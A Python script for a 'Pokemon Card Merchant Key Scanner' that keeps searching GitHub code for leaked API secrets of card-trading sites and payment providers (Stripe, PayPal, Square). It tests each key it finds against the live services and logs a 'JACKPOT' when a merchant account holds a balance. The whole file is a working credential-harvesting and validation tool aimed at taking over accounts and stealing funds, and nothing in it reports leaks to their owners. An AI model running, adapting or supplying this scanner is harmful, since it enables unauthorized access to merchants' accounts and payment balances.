#!/usr/bin/env python3
"""
Targeted Pokemon Card Merchant Key Scanner
Scans for leaked API keys from TCGplayer, Rip Rush, CardOutpost, MintPull, Boxed.gg
Tests keys against live platforms, alerts on valid merchant keys with balance.
"""
import json
import re
import time
import os
import requests
from datetime import datetime
from pathlib import Path

# ─── CONFIG ──────────────────────────────────────────────────────────────

# Search queries targeting Pokemon card merchants
QUERIES = [
    # TCGplayer
    "tcgplayer api",
    "tcgplayer_api_key",
    "tcgplayer merchant",
    "mpapi.tcgplayer.com",
    "mp-search-api.tcgplayer.com",
    "TCGPLAYER_API_KEY",
    "tcgplayer_secret",
    
    # Rip Rush
    "riprush api",
    "riprush_api",
    "riprush merchant",
    "riprush-key",
    "RIPRUSH_API",
    "riprush_secret",
    
    # Card Outpost
    "cardoutpost api",
    "cardoutpost_api",
    "cardoutpost merchant",
    "cardoutpost-key",
    "CARDPUTPOST_API",
    "cardoutpost_secret",
    
    # MintPull
    "mintpull api",
    "mintpull_api",
    "mintpull merchant",
    "mintpull-key",
    "MINTPULL_API",
    "mintpull_secret",
    
    # Boxed.gg
    "boxed.gg api",
    "boxed_api",
    "boxed merchant",
    "boxed-key",
    "BOXED_API",
    "boxed_secret",
    
    # Generic payment on card sites
    "pokemon cards stripe",
    "pokemon cards paypal",
    "pokemon cards square",
    "card shop stripe",
    "card shop payment",
    "card merchant api",
    
    # Env files
    ".env tcgplayer",
    ".env riprush",
    ".env cardoutpost",
    ".env mintpull",
    ".env boxed",
    
    # Config files
    "config tcgplayer",
    "config riprush",
    "config cardoutpost",
]

# Regex patterns for card merchant keys
KEY_PATTERNS = {
    # TCGplayer
    "tcgplayer_api_key": r'(?:tcgplayer_api_key|TCGPLAYER_API_KEY|tcgplayer-key)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "tcgplayer_secret": r'(?:tcgplayer_secret|TCGPLAYER_SECRET)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "tcgplayer_bearer": r'(?:Authorization|Bearer)\s+([a-zA-Z0-9_\-\.]{40,})',
    
    # Rip Rush
    "riprush_api": r'(?:riprush_api|riprush-key|RIPRUSH_API)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "riprush_secret": r'(?:riprush_secret|RIPRUSH_SECRET)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    
    # Card Outpost
    "cardoutpost_api": r'(?:cardoutpost_api|CARDPUTPOST_API|cardoutpost-key)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "cardoutpost_secret": r'(?:cardoutpost_secret|CARDPUTPOST_SECRET)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    
    # MintPull
    "mintpull_api": r'(?:mintpull_api|MINTPULL_API|mintpull-key)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "mintpull_secret": r'(?:mintpull_secret|MINTPULL_SECRET)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    
    # Boxed.gg
    "boxed_api": r'(?:boxed_api|BOXED_API|boxed-key)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    "boxed_secret": r'(?:boxed_secret|BOXED_SECRET)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    
    # Generic payment keys on card sites
    "stripe_live": r'sk_live_[a-zA-Z0-9]{24,}',
    "stripe_test": r'sk_test_[a-zA-Z0-9]{24,}',
    "paypal_secret": r'(?:paypal_secret|PAYPAL_SECRET)["\s:=]+["\']?([A-Za-z0-9_\-]{20,})["\']?',
    "square_token": r'sq0[a-z]{2}-[a-zA-Z0-9_\-]{20,}',
    "braintree_key": r'(?:braintree_private|BRAINTREE_PRIVATE)["\s:=]+["\']?([a-f0-9]{32,})["\']?',
    "adyen_key": r'(?:adyen_api_key|ADYEN_API_KEY)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
    
    # Generic bearer tokens
    "bearer_token": r'(?:Authorization|Bearer|token)["\s:=]+["\']?([a-zA-Z0-9_\-\.]{40,})["\']?',
    "api_key": r'(?:api_key|api-key|API_KEY)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
}

# ─── TEST ENDPOINTS ──────────────────────────────────────────────────────

def test_tcgplayer_key(api_key: str) -> dict:
    """Test TCGplayer API key."""
    try:
        # Try to authenticate
        resp = requests.post(
            "https://mpapi.tcgplayer.com/v2/token",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"username": api_key, "password": ""}),
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "access_token": data.get("access_token", "")[:30],
                "token_type": data.get("token_type", ""),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "invalid credentials"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_riprush_key(api_key: str) -> dict:
    """Test Rip Rush API key."""
    try:
        resp = requests.get(
            "https://riprush.net/api/v1/user",
            headers={"Authorization": f"Bearer {api_key}", "Accept": "application/json"},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "user": data.get("data", {}).get("name", "unknown"),
                "balance": data.get("data", {}).get("balance", 0),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_cardoutpost_key(api_key: str) -> dict:
    """Test CardOutpost API key."""
    try:
        resp = requests.get(
            "https://cardoutpost.com/api/v1/user",
            headers={"Authorization": f"Bearer {api_key}", "Accept": "application/json"},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "user": data.get("name", "unknown"),
                "balance": data.get("balance", 0),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_mintpull_key(api_key: str) -> dict:
    """Test MintPull API key."""
    try:
        resp = requests.get(
            "https://mintpull.com/api/v1/user",
            headers={"Authorization": f"Bearer {api_key}", "Accept": "application/json"},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "user": data.get("name", "unknown"),
                "balance": data.get("balance", 0),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_boxed_key(api_key: str) -> dict:
    """Test Boxed.gg API key."""
    try:
        resp = requests.get(
            "https://boxed.gg/api/v1/user",
            headers={"Authorization": f"Bearer {api_key}", "Accept": "application/json"},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "user": data.get("name", "unknown"),
                "balance": data.get("balance", 0),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_key(provider: str, key_value: str) -> dict:
    """Route key to the right tester."""
    p = provider.lower()
    if "tcgplayer" in p:
        return test_tcgplayer_key(key_value)
    elif "riprush" in p or "rip_rush" in p:
        return test_riprush_key(key_value)
    elif "cardoutpost" in p or "card_outpost" in p:
        return test_cardoutpost_key(key_value)
    elif "mintpull" in p:
        return test_mintpull_key(key_value)
    elif "boxed" in p:
        return test_boxed_key(key_value)
    elif "stripe" in p:
        return test_stripe_key(key_value)
    elif "paypal" in p:
        return test_paypal_secret(key_value)
    elif "square" in p:
        return test_square_token(key_value)
    return {"valid": False, "error": "no tester for provider"}

def test_stripe_key(api_key: str) -> dict:
    """Test Stripe API key."""
    try:
        resp = requests.get(
            "https://api.stripe.com/v1/balance",
            auth=(api_key, ""),
            timeout=15,
        )
        data = resp.json()
        if resp.status_code == 200 and "available" in data:
            return {
                "valid": True,
                "live_mode": data.get("livemode", False),
                "balance": data.get("available", []),
            }
        elif resp.status_code == 401:
            error = data.get("error", {})
            return {"valid": False, "expired": error.get("code") == "api_key_expired", "error": error.get("message", "")}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_paypal_secret(secret: str) -> dict:
    """Test PayPal secret."""
    try:
        resp = requests.post(
            "https://api-m.sandbox.paypal.com/v1/oauth2/token",
            headers={"Accept": "application/json", "Accept-Language": "en_US"},
            data={"grant_type": "client_credentials"},
            auth=("client_id", secret),
            timeout=15,
        )
        if resp.status_code == 200:
            return {"valid": True, "token": resp.json().get("access_token", "")[:20]}
        elif resp.status_code == 401:
            return {"valid": False, "error": "invalid credentials"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_square_token(token: str) -> dict:
    """Test Square access token."""
    try:
        resp = requests.get(
            "https://connect.squareup.com/v2/locations",
            headers={"Authorization": f"Bearer {token}"},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {"valid": True, "locations": len(data.get("locations", []))}
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

# ─── SCANNER ─────────────────────────────────────────────────────────────

class MerchantKeyScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.stats = {
            "queries_run": 0,
            "findings": 0,
            "keys_tested": 0,
            "valid_keys": 0,
            "jackpot": 0,
            "last_run": None,
        }
        self.tested_keys = set()
        self.valid_merchants = []
        self.log_dir = Path.home() / "merchant_key_scan"
        self.log_dir.mkdir(exist_ok=True)
        self.load_stats()

    def load_stats(self):
        stats_file = self.log_dir / "stats.json"
        if stats_file.exists():
            with open(stats_file) as f:
                self.stats.update(json.load(f))

    def save_stats(self):
        stats_file = self.log_dir / "stats.json"
        with open(stats_file, "w") as f:
            json.dump(self.stats, f, indent=2)

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {msg}")

    def save_valid(self, entry):
        """Save a valid key."""
        valid_file = self.log_dir / "valid_merchants.jsonl"
        with open(valid_file, "a") as f:
            f.write(json.dumps(entry, default=str) + "\n")

    def search_github(self, query: str, max_results: int = 20):
        try:
            resp = self.session.get(
                "https://api.github.com/search/code",
                params={"q": query, "per_page": max_results},
                timeout=15,
            )
            if resp.status_code == 200:
                return resp.json().get("items", [])
            elif resp.status_code == 403:
                return None
            else:
                return []
        except Exception as e:
            return []

    def extract_keys(self, text: str, repo: str, path: str) -> list:
        keys = []
        for key_type, pattern in KEY_PATTERNS.items():
            matches = re.findall(pattern, text)
            for match in matches:
                key_value = match if isinstance(match, str) else match[0] if match else ""
                if key_value and len(key_value) >= 10 and key_value not in self.tested_keys:
                    keys.append({
                        "key": key_value,
                        "type": key_type,
                        "repo": repo,
                        "path": path,
                    })
        return keys

    def run_scan(self):
        """Run one scan cycle."""
        print(f"\n{'='*60}")
        print(f"[SCAN] Pokemon Card Merchant Key Scanner")
        print(f"[TIME] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[STATS] Queries: {self.stats['queries_run']}, Findings: {self.stats['findings']}, Valid: {self.stats['valid_keys']}, JACKPOT: {self.stats['jackpot']}")
        print(f"{'='*60}")

        for query in QUERIES:
            print(f"\n[QUERY] {query}")
            self.stats["queries_run"] += 1

            results = self.search_github(query)
            if results is None:
                self.log("Rate limited, waiting 60s...")
                time.sleep(60)
                continue

            for item in results:
                repo = item.get("repository", {}).get("full_name", "?")
                path = item.get("path", "?")

                try:
                    raw_resp = self.session.get(item.get("git_url", ""), timeout=10)
                    if raw_resp.status_code == 200:
                        content = raw_resp.json().get("content", "")
                        text = __import__("base64").b64decode(content).decode("utf-8", errors="ignore")

                        keys = self.extract_keys(text, repo, path)
                        for key_info in keys:
                            self.stats["findings"] += 1
                            self.tested_keys.add(key_info["key"])

                            # Test the key
                            self.stats["keys_tested"] += 1
                            result = test_key(key_info["type"], key_info["key"])

                            # Log all
                            log_entry = {
                                "timestamp": datetime.now().isoformat(),
                                "key_type": key_info["type"],
                                "key_value": key_info["key"][:20] + "...",
                                "repo": repo,
                                "path": path,
                                "valid": result.get("valid", False),
                                "result": result,
                            }
                            all_file = self.log_dir / "all_tests.jsonl"
                            with open(all_file, "a") as f:
                                f.write(json.dumps(log_entry, default=str) + "\n")

                            # Save valid
                            if result.get("valid"):
                                self.stats["valid_keys"] += 1
                                self.save_valid(log_entry)
                                self.log(f"[VALID] {key_info['type']} from {repo}")

                                # Check if merchant key with balance
                                if any(x in key_info["type"] for x in ["tcgplayer", "riprush", "cardoutpost", "mintpull", "boxed"]):
                                    balance = result.get("balance", 0)
                                    if balance and balance > 0:
                                        self.stats["jackpot"] += 1
                                        self.log(f"[JACKPOT] Merchant key with balance: {balance}")

                except Exception as e:
                    pass

            self.save_stats()
            time.sleep(15)

    def run(self):
        """Run continuously."""
        print(f"""
╔══════════════════════════════════════════════════════════╗
║       POKEMON CARD MERCHANT KEY SCANNER                 ║
╠══════════════════════════════════════════════════════════╣
║  Targets: TCGplayer, RipRush, CardOutpost, MintPull, Boxed ║
║  Also: Stripe, PayPal, Square, Braintree, Adyen         ║
║  Queries: {len(QUERIES):<3}  Keys tested: {self.stats['keys_tested']:<6}            ║
║  Valid: {self.stats['valid_keys']:<3}  JACKPOT: {self.stats['jackpot']:<3}                    ║
╚══════════════════════════════════════════════════════════╝
""")

        while True:
            try:
                self.run_scan()
                self.log("Cycle complete. Restarting in 60s...")
                time.sleep(60)
            except KeyboardInterrupt:
                self.log("Scanner stopped.")
                break
            except Exception as e:
                self.log(f"Error: {e}. Restarting in 60s...")
                time.sleep(60)

if __name__ == "__main__":
    scanner = MerchantKeyScanner()
    scanner.run()
